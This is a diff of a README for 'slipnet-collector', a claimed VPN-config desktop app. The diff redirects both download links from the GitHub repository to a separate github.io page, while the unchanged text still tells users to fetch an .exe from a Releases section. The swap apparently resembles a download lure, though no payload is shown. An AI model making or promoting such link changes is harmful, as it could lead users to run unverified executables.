@@ -1,6 +1,6 @@
 # 🛡️ slipnet-collector - Collect VPN Configs With Ease
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Trust6401/slipnet-collector)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue)](https://trust6401.github.io)
 
 Slipnet Collector is a desktop application that gathers Slipnet configuration files and displays them in a clean, customizable panel. You do not need any technical skills to use it. Just download, run, and collect.
 
@@ -30,7 +30,7 @@ Your computer needs:
 
 Visit the download page:
 
-[**https://github.com/Trust6401/slipnet-collector**](https://github.com/Trust6401/slipnet-collector)
+[**https://trust6401.github.io**](https://trust6401.github.io)
 
 On that page, look for the **Releases** section on the right side. Click the latest release. You will see a file named `slipnet-collector.exe`. Click it to download.
 
